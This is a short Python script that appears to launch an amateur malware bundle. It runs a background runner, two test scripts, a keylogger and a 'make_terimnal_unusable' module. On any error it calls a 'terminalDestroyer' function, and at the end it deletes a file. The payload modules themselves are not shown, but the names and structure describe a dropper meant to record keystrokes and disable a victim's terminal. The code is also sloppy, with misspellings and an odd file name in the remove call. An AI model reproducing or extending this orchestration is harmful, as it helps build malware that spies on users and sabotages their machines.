import background_runner
import make_terimnal_unusable
import os
import subprocess


try:
        subprocess.run(["python", "background_runner.py"])
        subprocess.run(["python", "test.py"])
        subprocess.run(["python", "test1.py"])
        subprocess.run(["python", "make_terimnal_unusable.py"])
        subprocess.run(["python", "keylogger.py"])
        subprocess.run(["python", "make_terimnal_unusable.py"])
except Exception:
        make_terimnal_unusable.terminalDestroyer()

finally:
        os.remove('code runned successful')